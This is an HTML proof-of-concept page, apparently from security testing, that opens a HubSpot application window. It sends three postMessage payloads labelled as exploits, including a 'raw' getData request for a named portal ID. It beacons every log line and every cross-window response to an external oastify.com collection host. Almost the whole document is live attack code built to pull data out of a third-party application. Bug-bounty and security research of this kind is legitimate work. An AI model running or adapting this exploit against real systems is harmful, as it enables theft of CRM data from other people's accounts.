<!DOCTYPE html>
<html>
<head><title>Sandbox</title></head>
<body>
<h2>Sandbox Active</h2>
<div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
<script src="shared/logger.js"></script>
<script src="shared/exfil.js"></script>
<script src="shared/hubspot-poller.js"></script>
<script>
var exfil = Exfil.create('https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com');

var logger = PocLogger.create({
    timestampFormat: 'none',
    useTextContent: false,
    onLog: function(msg) {
        exfil.beacon('s', msg);
        console.log('[SANDBOX]', msg);
    }
});
function log(msg) { logger.log(msg); }

log('sandbox_script_running');
log('window_origin=' + window.origin);

log('attempting_to_open_hubspot');

HubSpotPoller.openAndPoll({
    url: 'https://app-eu1.hubspot.com',
    windowName: 'hubspot',
    windowFeatures: 'width=800,height=600',
    maxAttempts: 100,

    onBlocked: function() {
        log('ERROR_popup_blocked');
    },

    onOpened: function() {
        log('SUCCESS_popup_opened');
    },

    onProgress: function(attempts) {
        log('polling_attempt_' + attempts);
    },

    onLoaded: function(hub, attempts, errMsg) {
        log('hubspot_loaded_after_' + attempts + '_attempts');
        log('error_message=' + errMsg);

        window.addEventListener('message', function(resp) {
            log('RESPONSE_FROM=' + resp.origin);
            log('RESPONSE_TYPE=' + (resp.data.type || 'unknown'));
            exfil.beacon('response', JSON.stringify(resp.data).substring(0, 300));
        });

        setTimeout(function() {
            log('sending_exploit_1_CONTENT_ASSISTANCE');
            hub.postMessage({
                type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                commandId: 'exploit123',
                featureId: 'test',
                parameters: {},
                resultCount: 1,
                language: 'en',
                objectId: '46962361',
                applicationId: 'crm',
                basePath: '/',
                maxPollingAttempts: 1,
                pollingInterval: 100
            }, '*');
        }, 1000);

        setTimeout(function() {
            log('sending_exploit_2_RAW');
            hub.postMessage({
                type: 'raw',
                _callbackId: 'exploit-456',
                body: {
                    action: 'getData',
                    portalId: '46962361'
                }
            }, '*');
        }, 2000);

        setTimeout(function() {
            log('sending_exploit_3_DARK_MODE');
            hub.postMessage({
                type: 'TOGGLE_DARK_MODE',
                isDarkMode: true
            }, '*');
        }, 3000);
    },

    onTimeout: function(attempts) {
        log('TIMEOUT_after_' + attempts + '_attempts');
    },

    onError: function(errMsg) {
        log('CRITICAL_ERROR=' + errMsg);
    }
});
</script>
</body>
</html>
